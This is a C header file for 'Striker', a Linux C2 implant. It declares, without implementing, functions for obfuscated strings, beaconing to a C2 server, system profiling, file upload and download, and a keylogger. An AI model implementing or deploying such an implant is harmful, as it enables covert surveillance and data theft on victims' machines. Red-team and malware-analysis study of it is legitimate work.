/**
 *----------------------------------------------------
 * Header file for the Striker C2 implant for linux.
 * This should be included ONLY by the striker.c file.
 *                                  Author: Umar Abdul
 *----------------------------------------------------
 */

#ifndef STRIKER_H
#define STRIKER_H

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/select.h>
#include <pthread.h>
#include <curl/curl.h>
#include "cJSON.h"
#include "striker_utils.h"

// A struct for tracking session info.
typedef struct{
  char *uid; // The ID of the agent.
  unsigned long delay; // Callback delay, in seconds.
  char *write_dir; // Full path to a writable directory.
  unsigned short abort; // Will be set to 1 if session need to be ended.
} session;

// A struct for representing a single task.
typedef struct{
  char *uid; // The ID of the task
  char *type; // The type of the task
  cJSON *data; // The data needed by the task
  unsigned short completed; // Indicates if the task has been completed.
  unsigned short queued; // Indicates if the task has been queued.
  cJSON *result; // The result of the task.
  cJSON *input_json; // The cJSON object used to generate the task.
} task;

// For decoding obfuscated strings.
char *obfs_decode(char *str);

/**
 * Initializes a new CURL object for a request to `path` relative to the base URL of the C2 server.
 * It does not define any headers.
 * Defines `buff` as the buffer to use for writing reponse body by the body_receiver() function.
 */
CURL *init_curl(const char *path, buffer *buff);

/**
 * Callback function for curl to receive response body inside a buffer.
 * This may be called multiple times with chunks of data, depending on the size of the body.
 */
size_t body_receiver(void *chunk, size_t size, size_t nmemb, buffer *buff);

// Callback function for curl to write response body to a file.
size_t body_downloader(void *chunk, size_t size, size_t nmemb, FILE *wfo);

// Return a json object containing system information.
cJSON *sysinfo();

// Handles task for uploading file to server. Returns 1 on success.
short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff);

// Download a file from `url` and save to `wfo`. Returns 1 on success.
short int download_file(char *url, FILE *wfo, buffer *result_buff);

// Starts a keylogger for a given duration. Called in a thread.
void *keymon(void *ptr);

// Parse a task JSON and return it, NULL on error.
task *parse_task(cJSON *json);

// Free a task.
void free_task(task *tsk);

// Execute a task.
void execute_task(session *striker, task *t);

// Starts the implant.
void start_session();

// Cleanup session. Called on exit.
void cleanup_session(session *striker);

#endif // STRIKER_H